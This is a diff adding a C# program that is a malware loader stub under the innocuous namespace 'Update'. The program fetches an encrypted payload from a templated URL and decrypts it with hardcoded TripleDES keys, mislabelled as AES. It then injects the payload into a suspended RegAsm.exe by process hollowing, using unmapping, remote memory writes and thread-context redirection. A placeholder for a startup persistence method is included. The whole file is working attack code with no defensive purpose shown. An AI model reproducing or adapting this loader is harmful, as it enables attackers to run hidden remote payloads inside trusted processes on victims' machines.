@@ -1,0 +1,282 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Threading.Tasks;
+
+namespace Update
+{
+    class Program : APP
+    {
+
+        static void Main()
+        {
+            byte[] Key = Convert.FromBase64String("TxM4zjDL+WrdkYmUb5TvoQ==");
+
+            byte[] IV = Convert.FromBase64String("e2iOhnoh6dc=");
+
+            Construct(Key,IV);
+        }
+        private static async Task <byte[]> DownloadAsyncData(string URL)
+        {
+            if (!string.IsNullOrEmpty(URL))
+            {
+                WebRequest WEB_REQUEST = HttpWebRequest.Create(URL);
+                WebResponse RESPONSE_STREAM = await WEB_REQUEST.GetResponseAsync();
+                StreamReader READER = new StreamReader(RESPONSE_STREAM.GetResponseStream());
+                string BASE64 = await READER.ReadToEndAsync();
+                byte[] BUFFER = Convert.FromBase64String(BASE64);
+                return BUFFER;
+            }
+            return null;
+        }
+        static void Construct(byte[] Key, byte[] IV)
+        {
+
+            byte[] DOWNLOADED_DATA = DownloadAsyncData(Settings.Url).Result;
+
+            byte [] DUFFER = AES.Decrypt(DOWNLOADED_DATA, Key, IV);
+
+            Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe"), DUFFER);
+        }
+       
+        public static void Execute(string path, byte[] payload)
+        {
+            int lenghtForData = 5;
+            for (int i = 0; i < lenghtForData; i++)
+            {
+                int readWrite = 0x0;
+                Settings.si = new Settings.StartupInformation();
+                Settings.pi = new Settings.ProcessInformation();
+                Settings.si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(Settings.StartupInformation)));
+                try
+                {
+                    bool CreateProc = CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, Converts.returnUint(0x00000004) | Converts.returnUint(0x08000000), IntPtr.Zero, null, ref Settings.si, ref Settings.pi);
+                    if (!CreateProc)
+                    {
+
+                        throw new Exception();
+                    }
+
+                    int fileAddress = Converts.Convert32(payload, Converts.returnInt32(0x3C));
+                    int imageBase = Converts.Convert32(payload, fileAddress + Converts.returnInt32(0x34));
+                    int[] context = new int[0xB3];
+
+                    Int32 x = 0x0;
+                    Int32 y = 0x10002;
+                    context[Converts.returnInt32(x)] = Converts.returnInt32(y);
+
+                   
+                    if (IntPtr.Size == Converts.returnInt32(0x4))
+                    {
+                        bool GetThreadCon = GetThreadContext(Settings.pi.ThreadHandle, context);
+                        if (!GetThreadCon)
+                        {
+                            throw new Exception();
+                        }
+                        else
+                        {
+                            bool Wow64GetThreadCon = Wow64GetThreadContext(Settings.pi.ThreadHandle, context);
+                            if (!Wow64GetThreadCon)
+                            {
+                                throw new Exception();
+                            }
+                        }
+                    }
+                    int ebx = context[Converts.returnInt32(0x29)];
+                    int baseAddress = Converts.returnInt32(0x0);
+                    bool ReadProcMem = ReadProcessMemory(Settings.pi.ProcessHandle, ebx + Converts.returnInt32( 0x8), ref baseAddress, Converts.returnInt32(0x4), ref readWrite);
+                    if (!ReadProcMem)
+                    {
+                        throw new Exception();
+                    }
+                    if (imageBase == baseAddress)
+                    {
+                        var Unmap = ZwUnmapViewOfSection(Settings.pi.ProcessHandle, baseAddress);
+                        if (Unmap != Converts.returnInt32(0x0))
+                        {
+                            throw new Exception();
+                        }
+                    }
+
+                    int sizeOfImage = Converts.Convert32(payload, fileAddress + Converts.returnInt32(0x50));
+                    int sizeOfHeaders = Converts.Convert32(payload, fileAddress + Converts.returnInt32(0x54));
+                    bool allowOverride = false;
+                    int newImageBase = VirtualAllocEx(Settings.pi.ProcessHandle, imageBase, sizeOfImage, Converts.returnInt32(0x3000), Converts.returnInt32(0x40));
+
+                    if (newImageBase == Converts.returnInt32(0x0))
+                    {
+                        throw new Exception();
+                    }
+                    bool WriteProcessMem = WriteProcessMemory(Settings.pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite);
+                    if (!WriteProcessMem) { throw new Exception(); }
+
+                    int sectionOffset = fileAddress + 0xF8;
+                    short numberOfSections = BitConverter.ToInt16(payload, fileAddress + Converts.returnInt32(0x6));
+
+
+
+                    for (int I = 0; I < numberOfSections; I++)
+                    {
+                        int virtualAddress = Converts.Convert32(payload, sectionOffset + Converts.returnInt32(0xC));
+                        int sizeOfRawData = Converts.Convert32(payload, sectionOffset + Converts.returnInt32(0x10));
+                        int pointerToRawData = Converts.Convert32(payload, sectionOffset + Converts.returnInt32(0x14));
+                        if (sizeOfRawData != Converts.returnInt32(0x0))
+                        {
+                            byte[] sectionData = new byte[sizeOfRawData];
+                            Buffer.BlockCopy(payload, pointerToRawData, sectionData, Converts.returnInt32(0x0), sectionData.Length);
+                            bool WriteProcessMen = WriteProcessMemory(Settings.pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite);
+                            if (!WriteProcessMen)
+                            {
+                                throw new Exception();
+                            }
+
+                        }
+                        sectionOffset += 0x28;
+                    }
+                    byte[] pointerData = BitConverter.GetBytes(newImageBase);
+                    bool WriteProcess = WriteProcessMemory(Settings.pi.ProcessHandle, ebx + Converts.returnInt32(0x8), pointerData, Converts.returnInt32(0x4), ref readWrite);
+                    if (!WriteProcess)
+                    {
+                        throw new Exception();
+                    }
+                    int addressOfEntryPoint = Converts.Convert32(payload, fileAddress + Converts.returnInt32(0x28));
+                    if (allowOverride) { newImageBase = imageBase; }
+                    context[0x2C] = newImageBase + addressOfEntryPoint;
+
+                    if (IntPtr.Size == Converts.returnInt32(0x4))
+                    {
+                        bool SetThreadCon = SetThreadContext(Settings.pi.ThreadHandle, context);
+                        if (!SetThreadCon) throw new Exception();
+                    }
+                    else
+                    {
+                        bool Wow64SetThreadCon = Wow64SetThreadContext(Settings.pi.ThreadHandle, context);
+                        if (!Wow64SetThreadCon) throw new Exception();
+                    }
+                    var ResumeThre = ResumeThread(Settings.pi.ThreadHandle);
+                    if (ResumeThre == -1)
+                    {
+                        throw new Exception();
+                    }
+                }
+                catch
+                {
+                    Process.GetProcessById(Convert.ToInt32(Settings.pi.ProcessId)).Kill();
+                    continue;
+                }
+                break;
+            }
+        }
+    }
+    
+    class Converts
+    {
+        public static Int32 Convert32(byte[] payload, Int32 data)
+        {
+            return BitConverter.ToInt32(payload, data);
+        }
+        public static Int32 returnInt32(Int32 data)
+        {
+            return data;
+        }
+        public static uint returnUint(uint data)
+        {
+            return data;
+        }
+    }
+    class APP
+    {
+        
+
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        protected static extern int ResumeThread(IntPtr handle);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        protected static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        protected static extern bool SetThreadContext(IntPtr thread, int[] context);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        protected static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        protected static extern bool GetThreadContext(IntPtr thread, int[] context);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        protected static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        protected static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        protected static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        protected static extern int ZwUnmapViewOfSection(IntPtr process, int baseAddress);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        protected static extern bool CreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
+            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref Settings.StartupInformation startupInfo, ref Settings.ProcessInformation processInformation);
+    }
+    class Settings
+    {
+        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
+        public struct ProcessInformation
+        {
+            public readonly IntPtr ProcessHandle;
+            public readonly IntPtr ThreadHandle;
+            public readonly uint ProcessId;
+            private readonly uint ThreadId;
+        }
+        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
+        public struct StartupInformation
+        {
+            public uint Size;
+            private readonly string Reserved1;
+            private readonly string Desktop;
+            private readonly string Title;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
+            private readonly IntPtr Reserved2;
+            private readonly IntPtr StdInput;
+            private readonly IntPtr StdOutput;
+            private readonly IntPtr StdError;
+        }
+        public static string Startup = "%STARTUP_METHOD%";
+        public static string Url = "%URL%";
+        public static StartupInformation si = new StartupInformation();
+        public static ProcessInformation pi = new ProcessInformation();
+    }
+    class AES {
+        public static byte[] Decrypt(byte[] Code, byte[] key, byte[] iv)
+        {
+
+            using (var des = TripleDES.Create())
+            {
+                des.KeySize = 128;
+                des.BlockSize = 64;
+                des.Padding = PaddingMode.PKCS7;
+                des.Mode = CipherMode.CBC;
+                des.Key = key;
+                des.IV = iv;
+
+                using (var decryptor = des.CreateDecryptor(des.Key, des.IV))
+                {
+                    using (var EncShell = new MemoryStream())
+                    using (var Stream = new CryptoStream(EncShell, decryptor, CryptoStreamMode.Write))
+                    {
+                        Stream.Write(Code, 0, Code.Length);
+                        Stream.FlushFinalBlock();
+
+                        return EncShell.ToArray();
+                    };
+                }
+            }
+        }
+    }
+
+}
